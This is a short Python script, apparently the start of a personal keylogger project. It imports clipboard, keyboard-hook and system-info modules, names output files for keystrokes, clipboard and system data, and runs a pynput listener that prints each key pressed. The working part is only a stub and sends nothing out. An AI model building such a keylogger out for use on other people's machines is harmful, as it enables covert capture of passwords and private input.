#!/user/bin/python3
#sub modules
from distutils.file_util import write_file
from itertools import count
from turtle import onrelease
import win32clipboard #/GetclipboardData
from pynput.keyboard import Key, Listener
import socket #getHostname will get host name, and getHostbyname will get internal IP
import platform #get system info, such as processor etc. external IP: get(‘https://api.ipify.org’).text
import time
import os
#extensions
system_information = "system.txt"
keys_information = "keylogs.txt"
clipboard_info = "clipboard.txt"

file_path = "t:/Personal Projects/Keylogger/"

count=0
keys = []

def on_press(key):
    global keys, count
    print("{0} pressed".format(key))

        
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
